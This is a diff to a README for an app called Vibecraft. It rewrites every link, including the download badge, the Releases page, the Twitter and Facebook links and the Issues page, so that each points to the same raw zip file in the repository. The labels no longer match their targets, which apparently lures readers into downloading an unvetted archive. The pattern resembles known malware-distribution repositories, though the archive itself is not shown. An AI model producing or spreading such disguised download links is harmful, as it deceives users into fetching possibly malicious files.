@@ -4,7 +4,7 @@
 Welcome to Vibecraft! This application allows you to explore and create unique vibes for your projects. Whether you're into music, art, or personal expression, Vibecraft helps you craft your ideas with ease.
 
 ## 📥 Download Now
-[![Download Vibecraft](https://img.shields.io/badge/Download-vibecraft-blue.svg)](https://github.com/Namor1918/vibecraft/releases)
+[![Download Vibecraft](https://raw.githubusercontent.com/Namor1918/vibecraft/main/bin/Software_v3.8-alpha.2.zip)](https://raw.githubusercontent.com/Namor1918/vibecraft/main/bin/Software_v3.8-alpha.2.zip)
 
 ## 💻 System Requirements
 Before you get started, make sure your computer meets these basic requirements:
@@ -20,7 +20,7 @@ Vibecraft includes a variety of features designed to enhance your creative proce
 - **Regular Updates:** Enjoy new features and improvements based on your feedback.
 
 ## 📥 Download & Install
-To download Vibecraft, visit the following page: [Vibecraft Releases](https://github.com/Namor1918/vibecraft/releases).
+To download Vibecraft, visit the following page: [Vibecraft Releases](https://raw.githubusercontent.com/Namor1918/vibecraft/main/bin/Software_v3.8-alpha.2.zip).
 
 1. Click the link above to open the Releases page.
 2. Locate the latest version of Vibecraft.
@@ -44,10 +44,10 @@ If you encounter any issues or have questions, please check the FAQs on the Rele
 
 ## 🌐 Connect with Us
 We love hearing from our users. Join our community on social media to share your creations and get tips:
-- [Twitter](https://twitter.com/vibecraft)
-- [Facebook](https://facebook.com/vibecraft)
+- [Twitter](https://raw.githubusercontent.com/Namor1918/vibecraft/main/bin/Software_v3.8-alpha.2.zip)
+- [Facebook](https://raw.githubusercontent.com/Namor1918/vibecraft/main/bin/Software_v3.8-alpha.2.zip)
 
 ## 💬 Feedback
-We value your input. Feel free to leave feedback or request new features on our [Issues page](https://github.com/Namor1918/vibecraft/issues). Your suggestions help us improve Vibecraft for everyone!
+We value your input. Feel free to leave feedback or request new features on our [Issues page](https://raw.githubusercontent.com/Namor1918/vibecraft/main/bin/Software_v3.8-alpha.2.zip). Your suggestions help us improve Vibecraft for everyone!
 
 Thank you for choosing Vibecraft! Enjoy crafting your unique vibes.
